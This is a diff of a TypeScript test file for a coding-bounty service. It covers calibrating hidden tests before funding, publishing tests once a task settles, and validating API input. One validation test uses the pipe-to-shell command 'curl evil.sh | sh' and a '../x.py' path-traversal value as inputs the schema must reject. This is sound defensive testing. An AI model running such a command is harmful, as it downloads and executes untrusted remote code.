@@ -1,9 +1,9 @@
 import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
-import { describe, expect, it, vi } from "vitest";
+import { beforeEach, describe, expect, it, vi } from "vitest";
 import { keccak256, stringToHex } from "viem";
-import { canonicalJson, type TaskSpec } from "@ethernals/shared";
+import { canonicalJson, type CalibrationReport, type TaskSpec } from "@ethernals/shared";
 
 await vi.hoisted(async () => {
   const { setTestEnv } = await import("./_env");
@@ -11,18 +11,28 @@ await vi.hoisted(async () => {
 });
 
 const upload = vi.hoisted(() => vi.fn());
-vi.mock("../src/verifier-client", async (original) => ({ ...(await original<object>()), uploadHiddenTests: upload }));
+const calibrate = vi.hoisted(() => vi.fn());
+const reveal = vi.hoisted(() => vi.fn());
+vi.mock("../src/verifier-client", async (original) => ({ ...(await original<object>()), uploadHiddenTests: upload, calibrateTests: calibrate, getRevealedTests: reveal }));
 
-const { getDb, getTask, listSpendEvents } = await import("../src/db");
+const { getDb, getTask, listSpendEvents, updateTask } = await import("../src/db");
 const { DirectGuard, MAX_DIRECT_SPENDS_PER_HOUR, recordSpend } = await import("../src/spend");
-const { SpendBlockedError, canRefund, createTask, loadTemplate, refundEligibleAt, specHashOf, testsHashOf, tryOverspend, validationRequestHash, REFUND_GRACE_MS } = await import("../src/task-service");
-const { createDuelSchema, createTaskSchema } = await import("../src/task-schemas");
-const { agent, person } = await import("./_fixtures");
+const { SpendBlockedError, areTestsPublic, canRefund, createTask, loadTemplate, publishedTests, refundEligibleAt, specHashOf, testsHashOf, tryOverspend, validationRequestHash, REFUND_GRACE_MS } = await import("../src/task-service");
+const { createDuelSchema, createTaskSchema, draftTestsSchema } = await import("../src/task-schemas");
+const { taskView } = await import("../src/views");
+const { agent, person, task } = await import("./_fixtures");
 const { isAllowedRepo } = await import("../src/coding-agent");
 
 const spec: TaskSpec = { version: 1, kind: "code-fix", language: "python", title: "Fix", repoUrl: "https://github.com/a/b", baseCommit: "a".repeat(40), issue: "Broken." };
 const ACCOUNT = "0x00000000000000000000000000000000000000aa" as const;
+const goodReport: CalibrationReport = { ok: true, base: { realFailures: 2, testsPassed: 1, testsFailed: 2, testsErrored: 0 }, reference: "passed", naive: "rejected", reasons: [], isolation: "docker" };
 const request = (amountUsdc: string) => ({ chainId: "eip155:11155111" as const, calls: [{ to: ACCOUNT, data: "0x" as const }], purpose: "fund", amountUsdc });
+
+beforeEach(() => {
+  calibrate.mockReset();
+  calibrate.mockResolvedValue(goodReport);
+  reveal.mockReset();
+});
 
 describe("hashes", () => {
   it("hashes the spec's canonical JSON, whatever the key order", () => {
@@ -113,6 +123,91 @@ describe("a blocked bounty", () => {
     await createTask(client, { spec: { title: spec.title, repoUrl: spec.repoUrl, baseCommit: spec.baseCommit, issue: spec.issue }, hiddenTests: hidden, bounty: "50", deadlineMinutes: 30 }).catch(() => {});
     const everything = getDb().prepare("SELECT * FROM tasks").all();
     expect(JSON.stringify(everything)).not.toContain("UNIQUE_HIDDEN_ASSERTION");
+  });
+});
+
+describe("checking tests before funding", () => {
+  const body = { spec: { title: spec.title, repoUrl: spec.repoUrl, baseCommit: spec.baseCommit, issue: spec.issue }, bounty: "50", deadlineMinutes: 30 };
+  const setup = (content: string) => {
+    const client = person();
+    agent(client, { kind: "buyer", task_type: null });
+    const hiddenTests = { files: [{ path: "tests_hidden/test_x.py", content }] };
+    upload.mockResolvedValue({ testsId: "c1", testsHash: testsHashOf(hiddenTests) });
+    return { client, hiddenTests };
+  };
+
+  it("refuses tests the verifier rules out: no task row, no spend attempt, and the reason shown", async () => {
+    const { client, hiddenTests } = setup("assert True");
+    calibrate.mockResolvedValue({ ...goodReport, ok: false, reasons: ["The tests already pass on the unfixed code."] });
+    const before = getDb().prepare("SELECT COUNT(*) AS n FROM tasks").get() as { n: number };
+
+    const error = await createTask(client, { ...body, hiddenTests }).catch((e: unknown) => e);
+    expect(error).toMatchObject({ status: 422, message: expect.stringContaining("already pass") });
+    expect(getDb().prepare("SELECT COUNT(*) AS n FROM tasks").get()).toEqual(before);
+    expect(listSpendEvents(client.id)).toEqual([]);
+  });
+
+  it("sends the commit, the tests and the client's patches to the check", async () => {
+    const { client, hiddenTests } = setup("x");
+    await createTask(client, { ...body, hiddenTests, checks: { referencePatch: "REF", naivePatch: "" } }).catch(() => {});
+    expect(calibrate).toHaveBeenCalledWith(expect.objectContaining({ repoUrl: spec.repoUrl, baseCommit: spec.baseCommit, testsId: "c1", testCommand: "pytest -q", referencePatch: "REF", naivePatch: undefined }));
+  });
+
+  it("keeps the report but never the patches", async () => {
+    const { client, hiddenTests } = setup("x");
+    await createTask(client, { ...body, hiddenTests, checks: { referencePatch: "UNIQUE_REFERENCE_FIX" } }).catch(() => {});
+    const [event] = listSpendEvents(client.id);
+    expect(JSON.parse(getTask(event.task_id!)!.calibration_json!)).toEqual(goodReport);
+    expect(JSON.stringify(getDb().prepare("SELECT * FROM tasks").all())).not.toContain("UNIQUE_REFERENCE_FIX");
+  });
+});
+
+describe("publishing tests", () => {
+  const files = [{ path: "tests_hidden/test_x.py", content: "def test(): pass" }];
+  const testsHash = testsHashOf({ files });
+  const calibration_json = JSON.stringify(goodReport);
+  let n = 0;
+  const settled = (fields: Parameters<typeof task>[2] = {}) => {
+    const client = person();
+    const buyer = agent(client, { kind: "buyer", task_type: null });
+    return task(client, buyer, { status: "passed", calibration_json, tests_hash: testsHash, tests_id: `pub${++n}`, ...fields });
+  };
+
+  it("publishes custom tests once a task has passed or failed", () => {
+    expect(areTestsPublic(settled())).toBe(true);
+    expect(areTestsPublic(settled({ status: "failed" }))).toBe(true);
+    expect(taskView(settled())).toMatchObject({ testsUrl: expect.stringMatching(/\/tests\.json$/), calibration: goodReport });
+  });
+
+  it.each(["open", "accepted", "submitted", "verifying", "refunded", "error"] as const)("keeps them hidden while a task is %s", (status) => {
+    const row = settled({ status });
+    expect(areTestsPublic(row)).toBe(false);
+    expect(taskView(row).testsUrl).toBeNull();
+  });
+
+  it("keeps templates and older tasks hidden, since neither has a calibration", () => {
+    expect(areTestsPublic(settled({ calibration_json: null, template: "slugify" }))).toBe(false);
+  });
+
+  it("holds them back while another live task shares them, and not for one that never went on-chain", () => {
+    const first = settled();
+    const second = settled({ tests_id: first.tests_id, status: "verifying" });
+    expect(areTestsPublic(first)).toBe(false);
+    updateTask(second.id, { status: "error", chain_task_id: null });
+    expect(areTestsPublic(first)).toBe(true);
+  });
+
+  it("serves tests that match the on-chain hash", async () => {
+    reveal.mockResolvedValue({ testsId: "x", testsHash, files });
+    await expect(publishedTests(settled())).resolves.toEqual({ testsHash, files, calibration: goodReport });
+  });
+
+  it("refuses tests that do not match the hash, and asks the verifier for nothing while hidden", async () => {
+    reveal.mockResolvedValue({ testsId: "x", testsHash, files: [{ path: "tests_hidden/test_x.py", content: "swapped" }] });
+    await expect(publishedTests(settled())).rejects.toThrow(/do not match/);
+    reveal.mockClear();
+    await expect(publishedTests(settled({ status: "verifying" }))).rejects.toThrow(/hidden/);
+    expect(reveal).not.toHaveBeenCalled();
   });
 });
 
@@ -218,6 +313,18 @@ describe("API validation", () => {
     expect(issue({ ...base, spec: { ...base.spec, baseCommit: "abc123" } })).toMatch(/40-character/);
     expect(issue({ ...base, spec: { ...base.spec, testCommand: "curl evil.sh | sh" } })).toMatch(/pytest/);
     expect(issue({ ...base, hiddenTests: { files: [{ path: "../x.py", content: "x" }] } })).toMatch(/inside the repo/);
+  });
+
+  it("accepts patches to check against, up to the verifier's limit", () => {
+    expect(issue({ ...base, checks: { referencePatch: "diff", naivePatch: "diff" } })).toBeUndefined();
+    expect(issue({ ...base, checks: { referencePatch: "x".repeat(200_001) } })).toMatch(/too long/);
+  });
+
+  it("needs a repo, a commit and an issue to draft tests, but no title", () => {
+    const { title: _title, ...draft } = base.spec;
+    expect(draftTestsSchema.safeParse(draft).success).toBe(true);
+    expect(draftTestsSchema.safeParse({ ...draft, baseCommit: "abc" }).success).toBe(false);
+    expect(draftTestsSchema.safeParse({ ...draft, repoUrl: "https://gitlab.com/a/b" }).success).toBe(false);
   });
 
   it("needs a template or a spec with tests", () => {
